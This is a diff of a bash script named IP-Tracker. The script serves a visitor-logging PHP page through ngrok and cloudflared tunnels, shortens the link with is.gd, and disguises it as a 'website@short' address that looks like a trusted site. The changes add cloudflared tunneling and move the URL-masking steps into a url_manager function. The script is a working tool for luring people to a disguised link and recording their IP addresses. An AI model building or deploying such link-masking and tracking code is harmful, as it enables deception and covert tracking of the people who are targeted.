@@ -1,4 +1,4 @@
-#!bin/bash
+#!/bin/bash
 
 # IP-Tracker
 # Version    : 1.0
@@ -45,6 +45,9 @@ fi
 if [ `pidof ngrok > /dev/null 2>&1` ]; then
     killall ngrok
 fi
+if [ `pidof cloudflared > /dev/null 2>&1` ]; then
+    killall cloudflared
+fi
 if [ `pidof curl > /dev/null 2>&1` ]; then
     killall curl
 fi
@@ -63,6 +66,25 @@ netcheck() {
         fi
     done
 }
+ngrokdel() {
+    unzip ngrok.zip
+    rm -rf ngrok.zip
+}
+
+url_manager() {
+    sed 's+website_name+'$mwebsite'+g' ip.php > index.php
+    echo -e "${info}Your urls are: \n"
+    sleep 1
+    echo -e "${success}URL ${2} > ${1}\n"
+    sleep 1
+     masked=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${1})
+    if ! [[ -z $masked ]]; then
+        echo -e "${success}URL ${3} > ${masked}\n"
+        short=${masked#https://}
+        echo -e "${success}URL ${4} > $mwebsite@${short}\n"
+    fi
+}
+
 if [[ -d /data/data/com.termux/files/home ]]; then
 termux-fix-shebang ip.sh
 termux=true
@@ -124,52 +146,53 @@ if $termux; then
         killer; exit 1
     fi
 fi
-if ! [[ -f $HOME/.ngrokfolder/ngrok ]]; then
+if ! [[ -f $HOME/.ngrokfolder/ngrok || -f $HOME/.cffolder/cloudflared ]] ; then
+    if ! [[ -d $HOME/.ngrokfolder ]]; then
+        cd $HOME && mkdir .ngrokfolder
+    fi
+    if ! [[ -d $HOME/.cffolder ]]; then
+        cd $HOME && mkdir .cffolder
+    fi
     p=`uname -m`
     while true; do
-        echo -e "\n${info}Downloading ngrok!\n"
+        echo -e "\n${info}Downloading Tunnelers:\n"
         netcheck
+        if [ -e ngrok.zip ];then
+            rm -rf ngrok-stable-linux-arm.zip
+        fi
         if echo "$p" | grep -q "aarch64"; then
             if [ -e ngrok-stable-linux-arm64.tgz ];then
                 rm -rf ngrok-stable-linux-arm64.tgz
             fi
-            wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-arm64.tgz"
-            tar -zxf ngrok-stable-linux-arm64.tgz
-            rm -rf ngrok-stable-linux-arm64.tgz
+            wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-arm64.tgz" -O "ngrok.tgz"
+            tar -zxf ngrok.tgz
+            rm -rf ngrok.tgz
+            wget -q --show-progress "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64" -O "cloudflared"
             break
         elif echo "$p" | grep -q "arm"; then
-            if [ -e ngrok-stable-linux-arm.zip ];then
-                rm -rf ngrok-stable-linux-arm.zip
-            fi        
-            wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-arm.zip"
-            unzip ngrok-stable-linux-arm.zip
-            rm -rf ngrok-stable-linux-arm.zip
+            wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-arm.zip" -O "ngrok.zip"
+            ngrokdel
+            wget -q --show-progress 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' -O "cloudflared"
             break
         elif echo "$p" | grep -q "x86_64"; then
-            if [ -e ngrok-stable-linux-amd64.zip ];then
-                rm -rf ngrok-stable-linux-amd64.zip
-            fi        
-            wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-amd64.zip"
-            unzip ngrok-stable-linux-amd64.zip
-            rm -rf ngrok-stable-linux-amd64.zip
+
+            wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-amd64.zip" -O "ngrok.zip"
+            ngrokdel
+            wget -q --show-progress 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' -O "cloudflared"
             break
         else
-            if [ -e ngrok-stable-linux-386.zip ];then
-                rm -rf ngrok-stable-linux-386.zip
-            fi      
-            wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-386.zip"
-            unzip ngrok-stable-linux-386.zip
-            rm -rf ngrok-stable-linux-386.zip
+            wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-386.zip" -O "ngrok.zip"
+            ngrokdel
+            wget -q --show-progress "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386" -O "cloudflared"
             break
         fi
     done
-    if ! [[ -d $HOME/.ngrokfolder ]]; then
-        cd $HOME && mkdir .ngrokfolder
-    fi
     sleep 1
-    cd $cwd
+    cd "$cwd"
     mv -f ngrok $HOME/.ngrokfolder
+    mv -f cloudflared $HOME/.cffolder
     chmod +x $HOME/.ngrokfolder/ngrok
+    chmod +x $HOME/.cffolder/cloudflared
 fi
 if ! [ -e ip.php ]; then
 wget https://raw.githubusercontent.com/KasRoudra/IP-Tracker/main/ip.php
@@ -229,47 +252,56 @@ $red[Email]      ${cyan} :[kasroudrakrd@gmail.com]"
         sleep 1
     fi
 done
-if $termux; then
-    echo -e "\n${info}If you haven't enabled hotspot, please enable it!\n"
-    sleep 2
-fi
-sleep 1
-echo -e "${info}Starting php server at localhost:7777....\n"
+echo -e "\n${info}Starting php server at localhost:7777....\n"
 netcheck
 php -S 127.0.0.1:7777 > /dev/null 2>&1 &
 sleep 2
-echo -e "${info}Starting ngrok at same address......\n"
+echo -e "${info}Starting tunnelers......\n"
 netcheck
-cd $HOME/.ngrokfolder && ./ngrok http 127.0.0.1:7777 > /dev/null 2>&1 &
-sleep 1
-n=0
-while true; do
-    checkngrok=$(curl -s http://127.0.0.1:4040/api/tunnels)
-    if echo "$checkngrok" | grep -q "ngrok"; then
-        echo -e "${success}Ngrok started succesfully!\n"
-        break
-    elif (( $n == 7 )) ; then
-        if $termux; then
-            echo -e "${error}Ngrok couldn't start! Turn on hotspot and restart termux!\n\007"
-        else
-            echo -e "${error}Ngrok couldn't start! Restart terminal\n\007"
-        fi
-        killer; exit 1
-    else
-        sleep 2
-    fi
-((n++))
-done
-sleep 1
-ngrokurl=`curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"https:..([^"]*).*/\1/p'`
-if ! [ `echo $ngrokurl | grep -q "http"` ]; then
-    if ! (echo $ngrokurl | grep -q "https"); then
-         ngrokurl="https://${ngrokurl}"
-    else
-         ngrokurl="http://${ngrokurl}"
-    fi
+if [ -e "$HOME/.cffolder/log.txt" ]; then
+rm -rf "$HOME/.cffolder/log.txt"
 fi
-sed 's+website_name+'$mwebsite'+g' ip.php > index.php
+cd $HOME/.ngrokfolder && ./ngrok http 127.0.0.1:7777 > /dev/null 2>&1 &
+if $termux; then
+cd $HOME/.cffolder && termux-chroot ./cloudflared tunnel -url "127.0.0.1:7777" --logfile "log.txt" > /dev/null 2>&1 &
+else
+cd $HOME/.cffolder && ./cloudflared tunnel -url "127.0.0.1:7777" --logfile "log.txt" > /dev/null 2>&1 &
+fi
+sleep 8
+ngroklink=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
+if (echo "$ngroklink" | grep -q "ngrok"); then
+ngrokcheck=true
+else
+ngrokcheck=false
+fi
+cflink=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "$HOME/.cffolder/log.txt")
+if (echo "$cflink" | grep -q "cloudflare"); then
+cfcheck=true
+else
+cfcheck=false
+fi
+while true; do
+if ( $cfcheck && $ngrokcheck ); then
+    echo -e "${success}Cloudflared and Ngrok started succesfully!\n"
+    url_manager "$cflink" "1" "2" "3"
+    url_manager "$ngroklink" "4" "5" "6"
+    break
+fi
+if ( $cfcheck &&  ! $ngrokcheck ); then
+    echo -e "${success}Cloudflared started succesfully!\n"
+    url_manager "$cflink" "1" "2" "3"
+    break
+fi
+if ( $ngrokcheck && ! $cfcheck ); then
+    echo -e "${success}Ngrok started succesfully!\n"
+    url_manager "$ngroklink" "1" "2" "3"
+    break
+fi
+if ! ( $cfcheck && $ngrokcheck ) ; then
+    echo -e "${error}Tunneling failed!\n"
+    killer; exit 1
+fi
+done
 sleep 1
 status=$(curl -s --head -w %{http_code} 127.0.0.1:7777 -o /dev/null)
 if echo "$status" | grep -q "200" || echo "$status" | grep -q "302" ;then
@@ -277,24 +309,6 @@ if echo "$status" | grep -q "200" || echo "$status" | grep -q "302" ;then
 else
     echo -e "${error}PHP couldn't start!\n\007"
     killer; exit 1
-fi
-sleep 1
-if echo "$ngrokurl" | grep -q "ngrok"; then
-    echo -e "${info}Your urls are: \n"
-    sleep 1
-    echo -e "${success}URL 1 > ${ngrokurl}\n"
-else
-    echo -e "${error}Ngrok url error!\n\007"
-    killer; exit 1
-fi
-sleep 1
-masked=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${ngrokurl})
-if ! [[ -z $masked ]]; then
-    echo -e "${success}URL 2 > ${masked}\n"
-    short=${masked#https://}
-    echo -e "${success}URL 3 > $mwebsite@${short}\n"
-else
-    printf ""
 fi
 sleep 1
 rm -rf ip.txt
